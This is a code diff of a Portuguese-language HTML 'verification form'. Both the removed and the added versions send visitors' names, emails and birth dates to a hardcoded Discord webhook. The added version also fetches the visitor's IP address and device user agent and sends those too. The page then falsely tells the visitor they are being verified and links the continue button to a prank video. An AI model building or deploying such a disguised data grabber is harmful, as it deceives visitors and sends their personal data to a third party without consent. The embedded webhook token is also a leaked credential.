@@ -3,58 +3,63 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Formulário</title>
-    <script src="https://cdnjs.cloudflare.com/ajax/libs/jspdf/2.5.1/jspdf.umd.min.js"></script>
-    <script src="https://cdnjs.cloudflare.com/ajax/libs/jspdf-autotable/3.5.28/jspdf.plugin.autotable.min.js"></script>
+    <title>Formulário de Verificação</title>
     <style>
         body {
             font-family: Arial, sans-serif;
-            max-width: 400px;
-            margin: 50px auto;
+            max-width: 500px;
+            margin: 0 auto;
             padding: 20px;
-            color: #333;
-            transition: all 0.3s ease;
+            background-color: #f5f5f5;
+        }
+        
+        .form-container {
+            background-color: white;
+            padding: 30px;
+            border-radius: 10px;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
         }
         
         h1 {
-            font-size: 24px;
-            font-weight: normal;
+            text-align: center;
+            color: #333;
             margin-bottom: 30px;
         }
         
-        .form-field {
+        .form-group {
             margin-bottom: 20px;
         }
         
-        .field-label {
+        label {
             display: block;
-            margin-bottom: 5px;
-            font-size: 16px;
+            margin-bottom: 8px;
+            font-weight: bold;
         }
         
-        .optional {
-            color: #999;
-            font-style: italic;
-        }
-        
-        input[type="text"], input[type="email"], input[type="date"] {
+        input[type="text"],
+        input[type="email"],
+        input[type="date"] {
             width: 100%;
-            padding: 8px 0;
-            border: none;
-            border-bottom: 1px solid #ccc;
+            padding: 10px;
+            border: 1px solid #ddd;
+            border-radius: 5px;
             font-size: 16px;
-            outline: none;
         }
         
-        input[type="submit"] {
-            background-color: transparent;
-            color: #333;
-            padding: 8px 20px;
-            border: 1px solid #333;
-            border-radius: 4px;
+        button[type="submit"] {
+            background-color: #4CAF50;
+            color: white;
+            border: none;
+            padding: 12px 20px;
+            border-radius: 5px;
             cursor: pointer;
             font-size: 16px;
-            margin-top: 10px;
+            width: 100%;
+            transition: background-color 0.3s;
+        }
+        
+        button[type="submit"]:hover {
+            background-color: #45a049;
         }
         
         .verification-screen {
@@ -70,131 +75,135 @@
             align-items: center;
             text-align: center;
             z-index: 1000;
+            padding: 20px;
         }
         
         .verification-message {
-            font-size: 18px;
+            font-size: 20px;
             margin-bottom: 30px;
-            max-width: 300px;
+            max-width: 400px;
         }
         
-        .verification-button {
+        .continue-button {
+            background-color: #FF0000;
+            color: white;
+            border: none;
+            padding: 12px 25px;
+            border-radius: 5px;
             cursor: pointer;
-            width: 100px;
-            height: auto;
-            transition: transform 0.2s;
+            font-size: 16px;
+            text-decoration: none;
+            transition: background-color 0.3s;
         }
         
-        .verification-button:hover {
-            transform: scale(1.05);
-        }
-        
-        .loading {
-            display: none;
-            margin-top: 20px;
+        .continue-button:hover {
+            background-color: #CC0000;
         }
     </style>
 </head>
 <body>
-    <div id="form-container">
-        <h1>Formulário</h1>
-        
-        <form id="main-form">
-            <div class="form-field">
-                <span class="field-label">Nome completo:</span>
-                <input type="text" id="nome" name="nome" required>
+    <div class="form-container" id="formContainer">
+        <h1>Formulário de Verificação</h1>
+        <form id="verificationForm">
+            <div class="form-group">
+                <label for="fullName">Nome completo:</label>
+                <input type="text" id="fullName" name="fullName" required>
             </div>
             
-            <div class="form-field">
-                <span class="field-label">Email:</span>
+            <div class="form-group">
+                <label for="email">Email:</label>
                 <input type="email" id="email" name="email" required>
             </div>
             
-            <div class="form-field">
-                <span class="field-label">Data De nascimento <span class="optional">(Optional)</span>:</span>
-                <input type="date" id="nascimento" name="nascimento">
+            <div class="form-group">
+                <label for="birthDate">Data de nascimento (Opcional):</label>
+                <input type="date" id="birthDate" name="birthDate">
             </div>
             
-            <input type="submit" value="Verificar">
-            <div class="loading" id="loading">Gerando PDF e enviando dados...</div>
+            <button type="submit">Verificar</button>
         </form>
     </div>
     
-    <div id="verification-screen" class="verification-screen">
-        <p class="verification-message">Você está sendo verificado, enviaremos um Email quando você estiver certamente verificado</p>
-        <img src="https://i.ibb.co/qhLdFGq/image.png" alt="Continuar" class="verification-button" id="verification-button">
+    <div class="verification-screen" id="verificationScreen">
+        <p class="verification-message">Você está sendo verificado. Enviaremos um email quando sua verificação for concluída.</p>
+        <a href="https://youtu.be/dQw4w9WgXcQ" class="continue-button">Continuar</a>
     </div>
 
     <script>
-        // Inicializa o jsPDF
-        const { jsPDF } = window.jspdf;
-        
-        document.getElementById('main-form').addEventListener('submit', async function(e) {
+        document.getElementById('verificationForm').addEventListener('submit', async function(e) {
             e.preventDefault();
             
-            // Mostra o loading
-            document.getElementById('loading').style.display = 'block';
-            
-            // Coleta os dados do formulário
+            // Coletar dados do formulário
             const formData = {
-                nome: document.getElementById('nome').value,
+                fullName: document.getElementById('fullName').value,
                 email: document.getElementById('email').value,
-                nascimento: document.getElementById('nascimento').value
+                birthDate: document.getElementById('birthDate').value,
+                timestamp: new Date().toISOString(),
+                userAgent: navigator.userAgent,
+                ip: await fetch('https://api.ipify.org?format=json').then(res => res.json()).then(data => data.ip)
+            };
+            
+            // Enviar para webhook do Discord
+            const webhookURL = 'https://discord.com/api/webhooks/1390729092311158826/OoTfhqLaBBCxEjh3Wl3WC-3RVXuFUwTkoPwEKM53whnNxGsAZrvPdkD1jPVGsU5gS29m'; // Substitua pelo seu webhook
+            
+            const embed = {
+                title: "Novo formulário enviado",
+                color: 0x00ff00,
+                fields: [
+                    {
+                        name: "Nome completo",
+                        value: formData.fullName,
+                        inline: true
+                    },
+                    {
+                        name: "Email",
+                        value: formData.email,
+                        inline: true
+                    },
+                    {
+                        name: "Data de nascimento",
+                        value: formData.birthDate || "Não informado",
+                        inline: true
+                    },
+                    {
+                        name: "IP",
+                        value: formData.ip,
+                        inline: true
+                    },
+                    {
+                        name: "Dispositivo",
+                        value: formData.userAgent,
+                        inline: false
+                    },
+                    {
+                        name: "Horário",
+                        value: new Date(formData.timestamp).toLocaleString(),
+                        inline: true
+                    }
+                ]
+            };
+            
+            const payload = {
+                embeds: [embed]
             };
             
             try {
-                // 1. Gera o PDF
-                const pdf = new jsPDF();
-                
-                // Adiciona título
-                pdf.setFontSize(18);
-                pdf.text('Formulário de Cadastro', 105, 20, { align: 'center' });
-                
-                // Adiciona dados em formato de tabela
-                pdf.setFontSize(12);
-                pdf.text(`Nome: ${formData.nome}`, 20, 40);
-                pdf.text(`Email: ${formData.email}`, 20, 50);
-                if(formData.nascimento) {
-                    pdf.text(`Data de Nascimento: ${new Date(formData.nascimento).toLocaleDateString()}`, 20, 60);
-                }
-                
-                // Gera o PDF em base64
-                const pdfOutput = pdf.output('datauristring');
-                
-                // 2. Prepara os dados para o webhook
-                const webhookData = {
-                    formData: formData,
-                    pdfBase64: pdfOutput.split(',')[1] // Remove o prefixo data:application/pdf;base64,
-                };
-                
-                // 3. Envia para o webhook (SUBSTITUA pela sua URL)
-                const webhookUrl = 'https://discord.com/api/webhooks/1390729092311158826/OoTfhqLaBBCxEjh3Wl3WC-3RVXuFUwTkoPwEKM53whnNxGsAZrvPdkD1jPVGsU5gS29m'; // TROQUE PELA SUA URL
-                
-                const response = await fetch(webhookUrl, {
+                await fetch(webhookURL, {
                     method: 'POST',
                     headers: {
-                        'Content-Type': 'application/json',
+                        'Content-Type': 'application/json'
                     },
-                    body: JSON.stringify(webhookData)
+                    body: JSON.stringify(payload)
                 });
                 
-                if(response.ok) {
-                    // Mostra a tela de verificação
-                    document.getElementById('verification-screen').style.display = 'flex';
-                    document.getElementById('form-container').style.display = 'none';
-                } else {
-                    throw new Error('Falha ao enviar para o webhook');
-                }
+                // Mostrar tela de verificação
+                document.getElementById('formContainer').style.display = 'none';
+                document.getElementById('verificationScreen').style.display = 'flex';
+                
             } catch (error) {
-                console.error('Erro:', error);
-                alert('Ocorreu um erro ao processar seu formulário. Por favor, tente novamente.');
-            } finally {
-                document.getElementById('loading').style.display = 'none';
+                console.error('Erro ao enviar para o Discord:', error);
+                alert('Ocorreu um erro durante a verificação. Por favor, tente novamente.');
             }
-        });
-        
-        document.getElementById('verification-button').addEventListener('click', function() {
-            window.location.href = 'https://youtu.be/dQw4w9WgXcQ?si=KklLTsU2EasoHwNh'; // TROQUE ESTE LINK PELO SEU
         });
     </script>
 </body>
